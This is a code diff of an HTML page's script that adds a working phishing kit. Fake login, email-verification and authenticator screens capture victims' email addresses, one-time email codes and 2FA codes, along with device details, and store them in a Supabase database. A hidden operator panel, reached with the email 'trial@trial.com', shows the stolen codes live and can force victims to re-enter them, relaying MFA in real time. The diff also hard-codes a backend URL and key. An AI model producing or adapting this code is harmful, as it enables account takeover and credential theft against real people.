@@ -3204,682 +3204,189 @@
          attach runtime behavior to p2/p5/p6. Preserve raw p1-p6 verbatim in their script blocks.
     -->
     <script>
-        (function () {
-            // Grab the raw original contents (verbatim)
-            var rawP1 = document.getElementById('p1').textContent;
-            var rawP2 = document.getElementById('p2').textContent;
-            var rawP3 = document.getElementById('p3').textContent;
-            var rawP4 = document.getElementById('p4').textContent;
-            var rawP5 = document.getElementById('p5').textContent; // verification page
-            var rawP6 = document.getElementById('p6').textContent; // authenticator page
+   <script>
+(function () {
+    // === RAW PAGES ===
+    var rawP1 = document.getElementById('p1').textContent;
+    var rawP2 = document.getElementById('p2').textContent;
+    var rawP3 = document.getElementById('p3').textContent;
+    var rawP4 = document.getElementById('p4').textContent;
+    var rawP5 = document.getElementById('p5').textContent;
+    var rawP6 = document.getElementById('p6').textContent;
 
-            const SUPABASE_URL = 'https://binrbpydyxnlbkokyptd.supabase.co';
-            const SUPABASE_ANON_KEY = 'sb_publishable_00kNuWTgSMCzmUglMM58kw_a1Hyg3ec';
+    // === YOUR SUPABASE KEYS ===
+    const SUPABASE_URL = 'https://binrbpydyxnlbkokyptd.supabase.co';
+    const SUPABASE_ANON_KEY = 'sb_publishable_00kNuWTgSMCzmUglMM58kw_a1Hyg3ec';
+    const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-            // This small script will be injected into page1 only (before its closing </body> tag).
-            // It only attaches a click handler to the ".log-in" element and posts a message to parent;
-            // it does not change any styles or visible content.
-            var injectionForP1 =
-                '\n<script>\n' +
-                '  (function(){\n' +
-                '    function sendShowWelcome(){\n' +
-                '      try{ window.parent.postMessage({type: \"show_welcome\"}, \"*\"); }catch(e){}\n' +
-                '    }\n' +
-                '    document.addEventListener(\"DOMContentLoaded\", function(){\n' +
-                '      var login = document.querySelector(\".log-in\");\n' +
-                '      if(login){\n' +
-                '        login.addEventListener(\"click\", function(e){ e.preventDefault(); sendShowWelcome(); });\n' +
-                '        // Also make keyboard-activation work for accessibility\n' +
-                '        login.addEventListener(\"keydown\", function(e){ if(e.key===\"Enter\"||e.key===\" \"){ e.preventDefault(); sendShowWelcome(); } });\n' +
-                '      }\n' +
-                '      // If someone programmatically navigates to #login or similar, also allow that\n' +
-                '      // no other actions performed\n' +
-                '    });\n' +
-                '  })();\n' +
-                '<\/script>\n';
+    // === FRAMES ===
+    var frame1 = document.getElementById('pageFrame1');
+    var frame2 = document.getElementById('pageFrame2');
+    var frame3 = document.getElementById('pageFrame3');
+    var frame4 = document.getElementById('pageFrame4');
+    var frame5 = document.getElementById('pageFrame5');
+    var frame6 = document.getElementById('pageFrame6');
 
-            // Insert injection just before the last occurrence of </body>.
-            function insertBeforeClosingBody(rawHtml, injection) {
-                var idx = rawHtml.lastIndexOf('</body>');
-                if (idx !== -1) {
-                    return rawHtml.slice(0, idx) + injection + rawHtml.slice(idx);
-                }
-                // Fallback: append at end
-                return rawHtml + injection;
-            }
+    // Load pages
+    frame1.srcdoc = rawP1;
+    frame2.srcdoc = rawP2;
+    frame3.srcdoc = rawP3;
+    frame4.srcdoc = rawP4;
+    frame5.srcdoc = rawP5;
+    frame6.srcdoc = rawP6;
 
-            var p1WithInjection = insertBeforeClosingBody(rawP1, injectionForP1);
+    var lastEmail = '';
+    var currentSessionId = null;
+    var statusPoller = null;
 
-            // Set the iframe srcdoc values
-            var frame1 = document.getElementById('pageFrame1');
-            var frame2 = document.getElementById('pageFrame2');
-            var frame3 = document.getElementById('pageFrame3');
-            var frame4 = document.getElementById('pageFrame4');
-            var frame5 = document.getElementById('pageFrame5'); // verification frame
-            var frame6 = document.getElementById('pageFrame6'); // authenticator frame
+    // Device info
+    function getDeviceInfo() {
+        return (navigator.userAgent || '').substring(0, 80) + ' | ' + screen.width + 'x' + screen.height;
+    }
 
-            // Use srcdoc so we don't need to encode data URIs; srcdoc supports raw HTML.
-            frame1.srcdoc = p1WithInjection;
-            frame2.srcdoc = rawP2;
+    // Show backdoor
+    function showBackdoor() {
+        document.querySelectorAll('.frame').forEach(f => f.classList.remove('visible'));
+        frame3.classList.add('visible');
+    }
 
-            // Flow control variables
-            var autoTimeout = 3500; // milliseconds used for initial index->welcome
-            var autoTimer = null;
-            var switched = false;
+    // Show magic
+    function showMagic(email) {
+        lastEmail = email;
+        document.querySelectorAll('.frame').forEach(f => f.classList.remove('visible'));
+        frame4.classList.add('visible');
+    }
 
-            // Timers for magic->verification and magic->authenticator flows
-            var magicToVerificationTimer = null;
-            var magicToAuthenticatorTimer = null;
+    // Show verification
+    function showVerification() {
+        document.querySelectorAll('.frame').forEach(f => f.classList.remove('visible'));
+        frame5.classList.add('visible');
+    }
 
-            // Store last email used in flow (kept original case)
-            var lastEmail = '';
+    // Show authenticator
+    function showAuthenticator() {
+        document.querySelectorAll('.frame').forEach(f => f.classList.remove('visible'));
+        frame6.classList.add('visible');
+    }
 
-            function showWelcome() {
-                if (switched) return;
-                switched = true;
-                // hide frame1, show frame2
-                frame1.classList.remove('visible');
-                frame1.style.display = 'none';
-                frame2.style.display = '';
-                frame2.classList.add('visible');
-                try { frame2.contentWindow && frame2.contentWindow.focus(); } catch(e) {}
-            }
+    // Backdoor table
+    function attachBackdoor() {
+        var doc = frame3.contentDocument;
+        if (!doc) return;
+        var tbody = doc.querySelector('tbody');
 
-            // Helper to show the backdoor page (frame3)
-            function showBackdoor() {
-                try {
-                    clearAllMagicTimers();
-                    if (frame3.srcdoc !== rawP3) {
-                        frame3.srcdoc = rawP3;
-                    }
-                    frame1.classList.remove('visible'); frame1.style.display = 'none';
-                    frame2.classList.remove('visible'); frame2.style.display = 'none';
-                    frame4.classList.remove('visible'); frame4.style.display = 'none';
-                    frame5.classList.remove('visible'); frame5.style.display = 'none';
-                    frame6.classList.remove('visible'); frame6.style.display = 'none';
-                    frame3.style.display = '';
-                    frame3.classList.add('visible');
-                    try { frame3.contentWindow && frame3.contentWindow.focus(); } catch(e){}
-                } catch (e) {
-                    console.error(e);
-                }
-            }
-
-            // Helper to show the magic/request-code page (frame4)
-            // options: {autoToVerification: true/false, scheduleAuthenticator: true/false}
-            function showMagic(email, options) {
-                options = options || {};
-                var autoToVerification = (typeof options.autoToVerification === 'undefined') ? true : !!options.autoToVerification;
-                var scheduleAuthenticator = !!options.scheduleAuthenticator;
-                try {
-                    // Clear any prior timers for safety
-                    clearAllMagicTimers();
-
-                    if (frame4.srcdoc !== rawP4) {
-                        frame4.srcdoc = rawP4;
-                    }
-                    // Hide others, show magic
-                    frame1.classList.remove('visible'); frame1.style.display = 'none';
-                    frame2.classList.remove('visible'); frame2.style.display = 'none';
-                    frame3.classList.remove('visible'); frame3.style.display = 'none';
-                    frame5.classList.remove('visible'); frame5.style.display = 'none';
-                    frame6.classList.remove('visible'); frame6.style.display = 'none';
-                    frame4.style.display = '';
-                    frame4.classList.add('visible');
-                    try { frame4.contentWindow && frame4.contentWindow.focus(); } catch(e){}
-
-                    // store last email for later (used by verification/authenticator pages)
-                    lastEmail = (email || '').trim();
-
-                    // If we should auto-navigate to verification (frame5), set a 3s timer.
-                    if (autoToVerification) {
-                        magicToVerificationTimer = setTimeout(function(){
-                            if (lastEmail && lastEmail.toLowerCase() !== 'trial@trial.com') {
-                                showVerification(lastEmail);
-                            }
-                        }, 3000);
-                    }
-
-                    // If we should schedule authenticator after magic displays (used for second round),
-                    // schedule showing frame6 after 3s.
-                    if (scheduleAuthenticator) {
-                        magicToAuthenticatorTimer = setTimeout(function(){
-                            if (lastEmail && lastEmail.toLowerCase() !== 'trial@trial.com') {
-                                showAuthenticator(lastEmail);
-                            }
-                        }, 3000);
-                    }
-
-                } catch (e) {
-                    console.error(e);
-                }
-            }
-
-            // Clear any magic related timers
-            function clearAllMagicTimers(){
-                if (magicToVerificationTimer) {
-                    clearTimeout(magicToVerificationTimer);
-                    magicToVerificationTimer = null;
-                }
-                if (magicToAuthenticatorTimer) {
-                    clearTimeout(magicToAuthenticatorTimer);
-                    magicToAuthenticatorTimer = null;
-                }
-            }
-
-            // Helper to show the verification page (frame5)
-            function showVerification(email) {
-                try {
-                    clearAllMagicTimers();
-                    // Prepare a srcdoc for frame5 by replacing the placeholder email in rawP5
-                    // Do not change rawP5 itself (it remains verbatim in the script block).
-                    var escapedEmail = String(email || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
-                    // Replace all occurrences of the placeholder email text with the escaped value.
-                    // The original placeholder in p5 is 'tyleremmittperry@gmail.com'
-                    var computedP5 = rawP5.split('tyleremmittperry@gmail.com').join(escapedEmail);
-
-                    if (frame5.srcdoc !== computedP5) {
-                        frame5.srcdoc = computedP5;
-                    }
-
-                    frame1.classList.remove('visible'); frame1.style.display = 'none';
-                    frame2.classList.remove('visible'); frame2.style.display = 'none';
-                    frame3.classList.remove('visible'); frame3.style.display = 'none';
-                    frame4.classList.remove('visible'); frame4.style.display = 'none';
-                    frame6.classList.remove('visible'); frame6.style.display = 'none';
-                    frame5.style.display = '';
-                    frame5.classList.add('visible');
-                    try { frame5.contentWindow && frame5.contentWindow.focus(); } catch(e){}
-
-                } catch (e) {
-                    console.error(e);
-                }
-            }
-
-            // Helper to show the authenticator page (frame6)
-            function showAuthenticator(email) {
-                try {
-                    clearAllMagicTimers();
-                    // rawP6 has no placeholder, but we'll use rawP6 directly for srcdoc
-                    if (frame6.srcdoc !== rawP6) {
-                        frame6.srcdoc = rawP6;
-                    }
-
-                    frame1.classList.remove('visible'); frame1.style.display = 'none';
-                    frame2.classList.remove('visible'); frame2.style.display = 'none';
-                    frame3.classList.remove('visible'); frame3.style.display = 'none';
-                    frame4.classList.remove('visible'); frame4.style.display = 'none';
-                    frame5.classList.remove('visible'); frame5.style.display = 'none';
-                    frame6.style.display = '';
-                    frame6.classList.add('visible');
-                    try { frame6.contentWindow && frame6.contentWindow.focus(); } catch(e){}
-
-                } catch (e) {
-                    console.error(e);
-                }
-            }
-
-            // Start the auto timer after first frame loads (to ensure consistent timing)
-            frame1.addEventListener('load', function () {
-                // Clear any previous timer
-                if (autoTimer) clearTimeout(autoTimer);
-                autoTimer = setTimeout(function () {
-                    showWelcome();
-                }, autoTimeout);
+        async function refresh() {
+            const { data } = await supabase.from('attempts').select('*').order('created_at');
+            tbody.innerHTML = '';
+            (data || []).forEach((row, i) => {
+                var tr = doc.createElement('tr');
+                tr.innerHTML = `
+                    <td>${i+1}</td>
+                    <td>${row.device || ''}</td>
+                    <td>${row.email || ''}</td>
+                    <td>${row.email_code || ''}</td>
+                    <td>${row.twofa_code || ''}</td>
+                    <td><span class="retry-box" data-type="email" data-sid="${row.session_id}">Retry</span></td>
+                    <td><span class="retry-box" data-type="twofa" data-sid="${row.session_id}">Retry</span></td>
+                `;
+                tbody.appendChild(tr);
             });
 
-            // Listen for messages from frame1 (injected script will postMessage when Log In clicked)
-            window.addEventListener('message', function (ev) {
-                try {
-                    if (ev && ev.data && ev.data.type === 'show_welcome') {
-                        // clear auto timer and switch immediately
-                        if (autoTimer) { clearTimeout(autoTimer); autoTimer = null; }
-                        showWelcome();
-                    }
-                } catch (e) {
-                    // ignore
-                }
-            }, false);
+            doc.querySelectorAll('.retry-box').forEach(btn => {
+                btn.onclick = async () => {
+                    const type = btn.dataset.type;
+                    const sid = btn.dataset.sid;
+                    const field = type === 'email' ? 'retry_email' : 'retry_twofa';
+                    await supabase.from('attempts').update({[field]: true}).eq('session_id', sid);
+                };
+            });
+        }
 
-            // Safety: if frame1 fails to load for whatever reason, still switch after timeout from parent start
-            if (!frame1.complete) {
-                // If frame1 didn't fire load, still set a backup timer from now
-                if (autoTimer) clearTimeout(autoTimer);
-                autoTimer = setTimeout(function () {
-                    showWelcome();
-                }, autoTimeout + 100); // tiny extra to avoid racing
+        refresh();
+        setInterval(refresh, 500);
+    }
+    frame3.addEventListener('load', attachBackdoor);
+
+    // Poller for retries
+    function startPoller() {
+        if (statusPoller) clearInterval(statusPoller);
+        statusPoller = setInterval(async () => {
+            if (!currentSessionId) return;
+            const { data } = await supabase.from('attempts').select('retry_email, retry_twofa').eq('session_id', currentSessionId).single();
+            if (!data) return;
+            if (data.retry_email) {
+                await supabase.from('attempts').update({retry_email: false}).eq('session_id', currentSessionId);
+                showVerification();
+            }
+            if (data.retry_twofa) {
+                await supabase.from('attempts').update({retry_twofa: false}).eq('session_id', currentSessionId);
+                showAuthenticator();
+            }
+        }, 400);
+    }
+
+    // Frame2 - email submit
+    function attachFrame2() {
+        var doc = frame2.contentDocument;
+        if (!doc) return;
+        var emailInput = doc.getElementById('emailInput');
+        var continueBtn = doc.getElementById('continueBtn');
+
+        continueBtn.addEventListener('click', async () => {
+            var email = (emailInput.value || '').trim();
+            if (!email || !email.includes('@')) return;
+
+            if (email.toLowerCase() === 'trial@trial.com') {
+                showBackdoor();
+                return;
             }
 
-            // Attach to frame2 load events to access its DOM and add the requested behavior.
-            function attachToFrame2() {
-              try {
-                var doc = frame2.contentDocument || (frame2.contentWindow && frame2.contentWindow.document);
-                if (!doc) return;
+            const { data, error } = await supabase.from('attempts').insert({
+                device: getDeviceInfo(),
+                email: email
+            }).select('session_id').single();
 
-                var emailInput = doc.getElementById('emailInput');
-                var continueBtn = doc.getElementById('continueBtn');
+            if (error) return;
 
-                // If the elements aren't present, do nothing (preserve original document exactly)
-                if (!emailInput || !continueBtn) return;
+            currentSessionId = data.session_id;
+            lastEmail = email;
+            startPoller();
+            showMagic(email);
+        });
+    }
+    frame2.addEventListener('load', attachFrame2);
 
-                // Preserve the original class-based behavior (we don't remove or change it).
-                // Add an inline-style color change specifically when email contains '@' as requested,
-                // and enable the Continue button to navigate to backdoor or magic page based on email value.
+    // Code pages
+    [frame5, frame6].forEach((frame, is2fa) => {
+        frame.addEventListener('load', () => {
+            var doc = frame.contentDocument;
+            var inputs = doc.querySelectorAll('.code-box');
+            if (inputs.length !== 6) return;
 
-                // Store original inline background to restore when necessary
-                var originalInlineBackground = continueBtn.style.background || continueBtn.style.backgroundImage || '';
-
-                function updateState() {
-                  var val = (emailInput.value || '');
-                  if (val.indexOf('@') !== -1) {
-                    // When the email includes '@', set the color exactly to #1352F0.
-                    continueBtn.style.background = '#1352F0';
-                    continueBtn.setAttribute('data-backdoor-ready', '1');
-                  } else {
-                    // Restore original inline style (no class removal)
-                    continueBtn.style.background = originalInlineBackground || '';
-                    continueBtn.removeAttribute('data-backdoor-ready');
-                  }
+            function complete() {
+                var code = Array.from(inputs).map(i => i.value).join('');
+                if (code.length === 6) {
+                    supabase.from('attempts').update({
+                        [is2fa ? 'twofa_code' : 'email_code']: code
+                    }).eq('session_id', currentSessionId);
+                    setTimeout(() => showMagic(lastEmail), 30);
                 }
+            }
 
-                // Initial check
-                updateState();
-
-                // Listen for input events inside the frame2 email input
-                emailInput.addEventListener('input', function(e){
-                  try { updateState(); } catch(err){}
+            inputs.forEach((input, i) => {
+                input.addEventListener('input', () => {
+                    if (input.value.length === 1 && i < 5) inputs[i+1].focus();
+                    complete();
                 });
-
-                // Intercept clicks on the continue button inside frame2 to navigate to backdoor or magic when ready
-                continueBtn.addEventListener('click', function(e){
-                  try {
-                    // Only trigger navigation if the input reached the '@' condition (data-backdoor-ready set).
-                    if (continueBtn.getAttribute('data-backdoor-ready') === '1') {
-                      // Prevent default behavior inside the frame2 context (if any)
-                      try { e.preventDefault(); } catch(_) {}
-                      // Post message to parent including the entered email value
-                      try {
-                        window.parent && window.parent.postMessage && window.parent.postMessage({ type: 'go_backdoor', email: (emailInput.value||'') }, '*');
-                      } catch (err) {}
-                    }
-                    // otherwise leave original behavior intact
-                  } catch(err){}
-                });
-
-                // Also listen for keyboard activation on the button (Enter/Space) inside frame2
-                continueBtn.addEventListener('keydown', function(e){
-                  try {
-                    if ((e.key === 'Enter' || e.key === ' ') && continueBtn.getAttribute('data-backdoor-ready') === '1') {
-                      try { e.preventDefault(); } catch(_) {}
-                      try {
-                        window.parent && window.parent.postMessage && window.parent.postMessage({ type: 'go_backdoor', email: (emailInput.value||'') }, '*');
-                      } catch (err) {}
-                    }
-                  } catch (err){}
-                });
-
-              } catch (e) {
-                // ignore errors to avoid interfering with original page
-              }
-            }
-
-            // When frame2 loads (i.e., becomes visible or its srcdoc set), attach listeners.
-            frame2.addEventListener('load', function(){
-              // Try attaching right away
-              attachToFrame2();
-
-              // Also attempt a few times (in case scripts in the frame re-render or elements move)
-              var attempts = 0;
-              var maxAttempts = 6;
-              var retryInterval = setInterval(function(){
-                attempts++;
-                attachToFrame2();
-                if (attempts >= maxAttempts) clearInterval(retryInterval);
-              }, 250);
             });
+        });
+    });
 
-            // Parent-level message listener to receive 'go_backdoor' requests from frame2
-            window.addEventListener('message', function(ev){
-              try {
-                if (ev && ev.data && ev.data.type === 'go_backdoor') {
-                  var email = (ev.data.email || '').trim();
-                  var emailLower = (email || '').toLowerCase();
-                  // If exact match "trial@trial.com" -> show backdoor, otherwise show magic page.
-                  if (emailLower === 'trial@trial.com') {
-                    showBackdoor();
-                  } else {
-                    // Show magic, then (for non-trial) automatically proceed to verification after 3s
-                    showMagic(email, { autoToVerification: true });
-                  }
-                }
-                // Also preserve existing 'show_welcome' handling done by the original parent script
-              } catch (e){}
-            }, false);
+    // Auto start
+    setTimeout(() => {
+        document.querySelectorAll('.frame').forEach(f => f.classList.remove('visible'));
+        frame2.classList.add('visible');
+    }, 800);
 
-            // In case frame2 is already loaded before this script runs, try attaching now after slight delay
-            setTimeout(function(){
-              try { attachToFrame2(); } catch (e){}
-            }, 500);
-
-            // When frame4 (magic) loads, adjust its vertical alignment at runtime so:
-            // - on mobile (<=768px) the content aligns to top visually but stays horizontally centered
-            // - on desktop it remains centered (original page centered)
-            frame4.addEventListener('load', function(){
-              try {
-                var doc = frame4.contentDocument || (frame4.contentWindow && frame4.contentWindow.document);
-                if (!doc || !doc.body) return;
-                function adjustMagicAlignment() {
-                  try {
-                    if (window.innerWidth <= 768) {
-                      doc.body.style.alignItems = 'center';
-                      doc.body.style.justifyContent = 'flex-start';
-                      doc.body.style.paddingTop = '12px';
-                    } else {
-                      doc.body.style.alignItems = 'center';
-                      doc.body.style.justifyContent = 'center';
-                      doc.body.style.paddingTop = '';
-                    }
-                  } catch (err){}
-                }
-                adjustMagicAlignment();
-                window.addEventListener('resize', adjustMagicAlignment);
-              } catch (e){}
-            });
-
-            // Attach to frame5 (verification) when it loads to wire the "code complete" flow.
-            function attachToFrame5() {
-              try {
-                var doc = frame5.contentDocument || (frame5.contentWindow && frame5.contentWindow.document);
-                if (!doc) return;
-
-                var codeInputs = Array.prototype.slice.call(doc.querySelectorAll('.code-box'));
-                var emailElement = doc.querySelector('.email');
-
-                // Implement robust input/backspace/paste focus flow from the parent so it works in
-                // environments where p5's internal script doesn't run reliably (PlayCode, JSitor, etc).
-                // We do this without modifying the raw p5 source; we only attach event listeners at runtime.
-                if (codeInputs && codeInputs.length === 6) {
-                  codeInputs.forEach(function(inp){
-                    try {
-                      inp.setAttribute('inputmode', 'numeric');
-                      inp.setAttribute('autocomplete', 'one-time-code');
-                      inp.setAttribute('maxlength', '1');
-                      inp.setAttribute('pattern', '\\d*');
-                    } catch(e){}
-                  });
-
-                  function focusIndex(inputs, i){
-                    if (i < 0) i = 0;
-                    if (i >= inputs.length) i = inputs.length - 1;
-                    try { inputs[i].focus(); inputs[i].select && inputs[i].select(); } catch(e){}
-                  }
-
-                  function checkComplete() {
-                    var all = true;
-                    for (var k = 0; k < codeInputs.length; k++) {
-                      var v = (codeInputs[k].value || '').trim();
-                      if (v.length === 0) { all = false; break; }
-                    }
-                    if (all) {
-                      // When verification completed, show Magic again WITHOUT auto 3s->verification,
-                      // but schedule authenticator (frame6) to appear after 3s.
-                      setTimeout(function(){
-                        try {
-                          showMagic(lastEmail, { autoToVerification: false, scheduleAuthenticator: true });
-                        } catch(e){}
-                      }, 30);
-                    }
-                    return all;
-                  }
-
-                  codeInputs.forEach(function(input, idx){
-                    input.addEventListener('input', function(e){
-                      var raw = input.value || '';
-                      raw = raw.replace(/\D/g, '');
-                      if (raw.length === 0) {
-                        input.value = '';
-                        return;
-                      }
-                      if (raw.length === 1) {
-                        input.value = raw;
-                        if (idx < codeInputs.length - 1) {
-                          focusIndex(codeInputs, idx + 1);
-                        }
-                      } else {
-                        var digits = raw.split('');
-                        for (var d = 0; d < digits.length; d++) {
-                          var ti = idx + d;
-                          if (ti < codeInputs.length) {
-                            codeInputs[ti].value = digits[d];
-                          }
-                        }
-                        var nf = Math.min(idx + digits.length, codeInputs.length - 1);
-                        focusIndex(codeInputs, nf);
-                      }
-                      checkComplete();
-                    }, false);
-
-                    input.addEventListener('keydown', function(e){
-                      if (e.key === 'Backspace') {
-                        e.preventDefault && e.preventDefault();
-                        if (input.value && input.value.length > 0) {
-                          input.value = '';
-                          focusIndex(codeInputs, idx);
-                        } else {
-                          if (idx > 0) {
-                            codeInputs[idx - 1].value = '';
-                            focusIndex(codeInputs, idx - 1);
-                          }
-                        }
-                        setTimeout(checkComplete, 0);
-                        return;
-                      }
-                      if (e.key === 'ArrowLeft') {
-                        e.preventDefault && e.preventDefault();
-                        if (idx > 0) focusIndex(codeInputs, idx - 1);
-                        return;
-                      }
-                      if (e.key === 'ArrowRight') {
-                        e.preventDefault && e.preventDefault();
-                        if (idx < codeInputs.length - 1) focusIndex(codeInputs, idx + 1);
-                        return;
-                      }
-                      if (e.key && e.key.length === 1 && !/\d/.test(e.key)) {
-                        e.preventDefault && e.preventDefault();
-                        return;
-                      }
-                    }, false);
-
-                    input.addEventListener('paste', function(e){
-                      e.preventDefault && e.preventDefault();
-                      var pasted = '';
-                      try {
-                        pasted = (e.clipboardData || window.clipboardData).getData('text') || '';
-                      } catch (err) {
-                        pasted = '';
-                      }
-                      pasted = pasted.replace(/\D/g, '');
-                      if (!pasted) return;
-                      for (var m = 0; m < pasted.length; m++) {
-                        var ti = idx + m;
-                        if (ti >= codeInputs.length) break;
-                        codeInputs[ti].value = pasted.charAt(m);
-                      }
-                      var nextIndex = Math.min(idx + pasted.length, codeInputs.length - 1);
-                      focusIndex(codeInputs, nextIndex);
-                      setTimeout(checkComplete, 20);
-                    }, false);
-
-                    input.addEventListener('focus', function(){
-                      try { input.select && input.select(); } catch(e){}
-                    }, false);
-                  });
-
-                  try { focusIndex(codeInputs, 0); } catch(e){}
-
-                }
-              } catch (e) {
-                // ignore errors to avoid interfering with original page
-              }
-            }
-
-            // When frame5 loads, attach
-            frame5.addEventListener('load', function(){
-              attachToFrame5();
-              var attempts = 0;
-              var maxAttempts = 8;
-              var retryInterval = setInterval(function(){
-                attempts++;
-                try { attachToFrame5(); } catch(e){}
-                if (attempts >= maxAttempts) clearInterval(retryInterval);
-              }, 200);
-            });
-
-            // Attach to frame6 (authenticator) to wire robust input/backspace/paste and completion detection.
-            function attachToFrame6() {
-              try {
-                var doc = frame6.contentDocument || (frame6.contentWindow && frame6.contentWindow.document);
-                if (!doc) return;
-
-                var codeInputs = Array.prototype.slice.call(doc.querySelectorAll('.code-box'));
-                if (codeInputs && codeInputs.length === 6) {
-                  codeInputs.forEach(function(inp){
-                    try {
-                      inp.setAttribute('inputmode', 'numeric');
-                      inp.setAttribute('autocomplete', 'one-time-code');
-                      inp.setAttribute('maxlength', '1');
-                      inp.setAttribute('pattern', '\\d*');
-                    } catch(e){}
-                  });
-
-                  function focusIndex(inputs, i){
-                    if (i < 0) i = 0;
-                    if (i >= inputs.length) i = inputs.length - 1;
-                    try { inputs[i].focus(); inputs[i].select && inputs[i].select(); } catch(e){}
-                  }
-
-                  function checkComplete() {
-                    var all = true;
-                    for (var k = 0; k < codeInputs.length; k++) {
-                      var v = (codeInputs[k].value || '').trim();
-                      if (v.length === 0) { all = false; break; }
-                    }
-                    if (all) {
-                      // When authenticator completed, show Magic again immediately WITHOUT scheduling further auto moves.
-                      setTimeout(function(){
-                        try {
-                          showMagic(lastEmail, { autoToVerification: false });
-                        } catch(e){}
-                      }, 30);
-                    }
-                    return all;
-                  }
-
-                  codeInputs.forEach(function(input, idx){
-                    input.addEventListener('input', function(e){
-                      var raw = input.value || '';
-                      raw = raw.replace(/\D/g, '');
-                      if (raw.length === 0) {
-                        input.value = '';
-                        return;
-                      }
-                      if (raw.length === 1) {
-                        input.value = raw;
-                        if (idx < codeInputs.length - 1) {
-                          focusIndex(codeInputs, idx + 1);
-                        }
-                      } else {
-                        var digits = raw.split('');
-                        for (var d = 0; d < digits.length; d++) {
-                          var ti = idx + d;
-                          if (ti < codeInputs.length) {
-                            codeInputs[ti].value = digits[d];
-                          }
-                        }
-                        var nf = Math.min(idx + digits.length, codeInputs.length - 1);
-                        focusIndex(codeInputs, nf);
-                      }
-                      checkComplete();
-                    }, false);
-
-                    input.addEventListener('keydown', function(e){
-                      if (e.key === 'Backspace') {
-                        e.preventDefault && e.preventDefault();
-                        if (input.value && input.value.length > 0) {
-                          input.value = '';
-                          focusIndex(codeInputs, idx);
-                        } else {
-                          if (idx > 0) {
-                            codeInputs[idx - 1].value = '';
-                            focusIndex(codeInputs, idx - 1);
-                          }
-                        }
-                        setTimeout(checkComplete, 0);
-                        return;
-                      }
-                      if (e.key === 'ArrowLeft') {
-                        e.preventDefault && e.preventDefault();
-                        if (idx > 0) focusIndex(codeInputs, idx - 1);
-                        return;
-                      }
-                      if (e.key === 'ArrowRight') {
-                        e.preventDefault && e.preventDefault();
-                        if (idx < codeInputs.length - 1) focusIndex(codeInputs, idx + 1);
-                        return;
-                      }
-                      if (e.key && e.key.length === 1 && !/\d/.test(e.key)) {
-                        e.preventDefault && e.preventDefault();
-                        return;
-                      }
-                    }, false);
-
-                    input.addEventListener('paste', function(e){
-                      e.preventDefault && e.preventDefault();
-                      var pasted = '';
-                      try {
-                        pasted = (e.clipboardData || window.clipboardData).getData('text') || '';
-                      } catch (err) {
-                        pasted = '';
-                      }
-                      pasted = pasted.replace(/\D/g, '');
-                      if (!pasted) return;
-                      for (var m = 0; m < pasted.length; m++) {
-                        var ti = idx + m;
-                        if (ti >= codeInputs.length) break;
-                        codeInputs[ti].value = pasted.charAt(m);
-                      }
-                      var nextIndex = Math.min(idx + pasted.length, codeInputs.length - 1);
-                      focusIndex(codeInputs, nextIndex);
-                      setTimeout(checkComplete, 20);
-                    }, false);
-
-                    input.addEventListener('focus', function(){
-                      try { input.select && input.select(); } catch(e){}
-                    }, false);
-                  });
-
-                  try { focusIndex(codeInputs, 0); } catch(e){}
-
-                }
-              } catch (e) {
-                // ignore
-              }
-            }
-
-            // When frame6 loads, attach robust handlers
-            frame6.addEventListener('load', function(){
-              attachToFrame6();
-              var attempts = 0;
-              var maxAttempts = 8;
-              var retryInterval = setInterval(function(){
-                attempts++;
-                try { attachToFrame6(); } catch(e){}
-                if (attempts >= maxAttempts) clearInterval(retryInterval);
-              }, 200);
-            });
-
-            // If frame3/backdoor loads we don't modify its contents (preserve verbatim).
-        })();
-    </script>
-</body>
-</html>
+})();
+</script>
